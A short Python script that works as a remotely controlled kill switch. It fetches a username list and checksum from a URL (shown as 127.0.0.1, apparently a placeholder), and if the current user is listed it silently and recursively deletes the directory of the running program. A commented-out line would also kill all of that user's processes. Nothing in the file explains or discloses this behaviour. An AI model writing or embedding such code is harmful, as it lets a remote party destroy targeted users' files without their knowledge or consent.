import os 
import shutil
import urllib.request

import __main__

from hashlib import sha512
from getpass import getuser

target_location = "http://127.0.0.1/user.txt"
check_sum = "http://127.0.0.1/checksum.txt"

userdata = urllib.request.urlopen(target_location)
checkdata = urllib.request.urlopen(check_sum)

data = userdata.read()
checksum = checkdata.read().decode("utf-8")[:-1]

if(checksum != sha512(data).hexdigest()):
    exit()

user = data.decode("utf-8")[:-1].split('_')

if getuser() in user:
    try:
        current_path = os.path.abspath('/'.join(__main__.__file__.split('/')[:-1]))
        shutil.rmtree(current_path, ignore_errors=True)
        
        #os.system("pkill -u %s" % (getuser()))

    except AttributeError:
        pass
